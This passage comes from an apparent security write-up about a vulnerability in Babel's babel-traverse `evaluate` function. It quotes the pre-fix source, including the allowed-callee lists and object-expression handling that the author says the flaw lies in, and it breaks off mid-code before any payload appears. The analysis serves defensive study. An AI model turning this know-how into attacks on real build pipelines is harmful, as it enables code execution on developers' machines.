<h3 class="anchor anchorWithStickyNavbar_LWe7" id=exploit-breakdown>Exploit Breakdown<a href=#exploit-breakdown class=hash-link aria-label="Direct link to Exploit Breakdown" title="Direct link to Exploit Breakdown">​</a></h3>
<p>To understand why this vulnerability works, we need to understand the source code of the culprit function, <code>evaluate</code>. The source code of <code>babel-traverse/src/path/evaluation.ts</code> prior to the fix is archived <a href=https://github.com/babel/babel/blob/7e198e5959b18373db3936fa3223c0811cebfac1/packages/babel-traverse/src/path/evaluation.ts target=_blank rel="noopener noreferrer">here</a></p>
<div class="language-typescript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-typescript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c>/**</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * Walk the input `node` and statically evaluate it.</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * Returns an object in the form `</span><span class="token doc-comment comment punctuation" style=color:#8e908c>{</span><span class="token doc-comment comment" style=color:#8e908c> confident, value, deopt </span><span class="token doc-comment comment punctuation" style=color:#8e908c>}</span><span class="token doc-comment comment" style=color:#8e908c>`. `confident`</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * indicates whether or not we had to drop out of evaluating the expression</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * because of hitting an unknown node that we couldn't confidently find the</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * value of, in which case `deopt` is the path of said node.</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> * Example:</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *   t.evaluate(parse("5 + 5")) // </span><span class="token doc-comment comment punctuation" style=color:#8e908c>{</span><span class="token doc-comment comment" style=color:#8e908c> confident: true, value: 10 </span><span class="token doc-comment comment punctuation" style=color:#8e908c>}</span><span class="token doc-comment comment" style=color:#8e908c></span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *   t.evaluate(parse("!true")) // </span><span class="token doc-comment comment punctuation" style=color:#8e908c>{</span><span class="token doc-comment comment" style=color:#8e908c> confident: true, value: false </span><span class="token doc-comment comment punctuation" style=color:#8e908c>}</span><span class="token doc-comment comment" style=color:#8e908c></span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *   t.evaluate(parse("foo + foo")) // </span><span class="token doc-comment comment punctuation" style=color:#8e908c>{</span><span class="token doc-comment comment" style=color:#8e908c> confident: false, value: undefined, deopt: NodePath </span><span class="token doc-comment comment punctuation" style=color:#8e908c>}</span><span class="token doc-comment comment" style=color:#8e908c></span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> *</span><br></span><span class=token-line style=color:#4d4d4c><span class="token doc-comment comment" style=color:#8e908c> */</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>export</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>function</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>evaluate</span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>this</span><span class="token operator">:</span><span class="token plain"> NodePath</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  confident</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>boolean</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  value</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>any</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  deopt</span><span class="token operator">?</span><span class="token operator">:</span><span class="token plain"> NodePath</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> state</span><span class="token operator">:</span><span class="token plain"> State </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    confident</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean" style=color:#f5871f>true</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    deoptPath</span><span class="token operator">:</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>null</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    seen</span><span class="token operator">:</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>new</span><span class="token plain"> </span><span class="token class-name" style=color:#eab700>Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>let</span><span class="token plain"> value </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>evaluateCached</span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>this</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token plain">state</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">)</span><span class="token plain"> value </span><span class="token operator">=</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>undefined</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    confident</span><span class="token operator">:</span><span class="token plain"> state</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    deopt</span><span class="token operator">:</span><span class="token plain"> state</span><span class="token punctuation">.</span><span class="token plain">deoptPath</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    value</span><span class="token operator">:</span><span class="token plain"> value</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>When <code>evaluate</code> is called on a NodePath, it goes through the <code>evaluatedCached</code> wrapper, before reaching the <code>_evaluate</code> function which does all the heavy lifting. The <code>_evaluate</code> function is where the vulnerability lies.</p>
<p>This function is responsible for recursively breaking down AST nodes until it reaches an atomic operation that can be evaluated confidently. The majority of the base cases are evaluated for atomic operations only (such as for binary expressions between two literals). However, there are a few exceptions to this rule.</p>
<p>The two pieces of the source code we care about are the handling of <strong>call expressions</strong> and <strong>object expressions</strong>, as shown below:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id=vulnerable-source-code>Vulnerable Source Code<a href=#vulnerable-source-code class=hash-link aria-label="Direct link to Vulnerable Source Code" title="Direct link to Vulnerable Source Code">​</a></h4>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed=true><summary>Relevant <code>_evaluate</code> source code</summary><div><div class=collapsibleContent_i85q><div class="language-typescript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-typescript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_OBJECT_CALLEES</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">[</span><span class="token string" style=color:#718c00>"Number"</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"String"</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"Math"</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>const</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_IDENTIFIER_CALLEES</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">[</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"isFinite"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"isNaN"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"parseFloat"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"parseInt"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"decodeURI"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"decodeURIComponent"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"encodeURI"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token string" style=color:#718c00>"encodeURIComponent"</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  process</span><span class="token punctuation">.</span><span class="token plain">env</span><span class="token punctuation">.</span><span class="token constant" style=color:#f5871f>BABEL_8_BREAKING</span><span class="token plain"> </span><span class="token operator">?</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"btoa"</span><span class="token plain"> </span><span class="token operator">:</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>null</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  process</span><span class="token punctuation">.</span><span class="token plain">env</span><span class="token punctuation">.</span><span class="token constant" style=color:#f5871f>BABEL_8_BREAKING</span><span class="token plain"> </span><span class="token operator">?</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"atob"</span><span class="token plain"> </span><span class="token operator">:</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>null</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>const</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>INVALID_METHODS</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">[</span><span class="token string" style=color:#718c00>"random"</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>const</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>function</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>isValidObjectCallee</span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  val</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>string</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token plain"> val </span><span class="token keyword" style=color:#8959a8>is</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>typeof</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_OBJECT_CALLEES</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin" style=color:#f5871f>number</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_OBJECT_CALLEES</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>includes</span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token comment" style=color:#8e908c>// @ts-expect-error val is a string</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    val</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>function</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>isValidIdentifierCallee</span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  val</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>string</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token plain"> val </span><span class="token keyword" style=color:#8959a8>is</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>typeof</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_IDENTIFIER_CALLEES</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin" style=color:#f5871f>number</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>VALID_IDENTIFIER_CALLEES</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>includes</span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token comment" style=color:#8e908c>// @ts-expect-error val is a string</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    val</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>function</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>isInvalidMethod</span><span class="token punctuation">(</span><span class="token plain">val</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>string</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token plain"> val </span><span class="token keyword" style=color:#8959a8>is</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>typeof</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>INVALID_METHODS</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin" style=color:#f5871f>number</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token constant" style=color:#f5871f>INVALID_METHODS</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>includes</span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token comment" style=color:#8e908c>// @ts-expect-error val is a string</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    val</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>function</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>_evaluate</span><span class="token punctuation">(</span><span class="token plain">path</span><span class="token operator">:</span><span class="token plain"> NodePath</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token operator">:</span><span class="token plain"> State</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token plain"> </span><span class="token builtin" style=color:#f5871f>any</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token doc-comment comment" style=color:#8e908c>/** snip **/</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">path</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isObjectExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> obj </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> props </span><span class="token operator">=</span><span class="token plain"> path</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>for</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> prop </span><span class="token keyword" style=color:#8959a8>of</span><span class="token plain"> props</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">prop</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isObjectMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">||</span><span class="token plain"> prop</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isSpreadElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token function" style=color:#4271ae>deopt</span><span class="token punctuation">(</span><span class="token plain">prop</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token keyword" style=color:#8959a8>return</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> keyPath </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">prop </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> NodePath</span><span class="token operator">&lt;</span><span class="token plain">t</span><span class="token punctuation">.</span><span class="token plain">ObjectProperty</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>let</span><span class="token plain"> key</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token comment" style=color:#8e908c>// @ts-expect-error todo(flow->ts): type refinement issues ObjectMethod and SpreadElement somehow not excluded</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">prop</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">computed</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        key </span><span class="token operator">=</span><span class="token plain"> keyPath</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>evaluate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token plain">key</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          </span><span class="token function" style=color:#4271ae>deopt</span><span class="token punctuation">(</span><span class="token plain">key</span><span class="token punctuation">.</span><span class="token plain">deopt</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          </span><span class="token keyword" style=color:#8959a8>return</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        key </span><span class="token operator">=</span><span class="token plain"> key</span><span class="token punctuation">.</span><span class="token plain">value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>else</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">keyPath</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        key </span><span class="token operator">=</span><span class="token plain"> keyPath</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>else</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        key </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          keyPath</span><span class="token punctuation">.</span><span class="token plain">node </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> t</span><span class="token punctuation">.</span><span class="token plain">StringLiteral </span><span class="token operator">|</span><span class="token plain"> t</span><span class="token punctuation">.</span><span class="token plain">NumericLiteral </span><span class="token operator">|</span><span class="token plain"> t</span><span class="token punctuation">.</span><span class="token plain">BigIntLiteral</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token plain">value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> valuePath </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">prop </span><span class="token keyword" style=color:#8959a8>as</span><span class="token plain"> NodePath</span><span class="token operator">&lt;</span><span class="token plain">t</span><span class="token punctuation">.</span><span class="token plain">ObjectProperty</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>let</span><span class="token plain"> value </span><span class="token operator">=</span><span class="token plain"> valuePath</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>evaluate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token plain">value</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token function" style=color:#4271ae>deopt</span><span class="token punctuation">(</span><span class="token plain">value</span><span class="token punctuation">.</span><span class="token plain">deopt</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token keyword" style=color:#8959a8>return</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      value </span><span class="token operator">=</span><span class="token plain"> value</span><span class="token punctuation">.</span><span class="token plain">value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token comment" style=color:#8e908c>// @ts-expect-error key is any type</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token class-name" style=color:#eab700>obj</span><span class="token 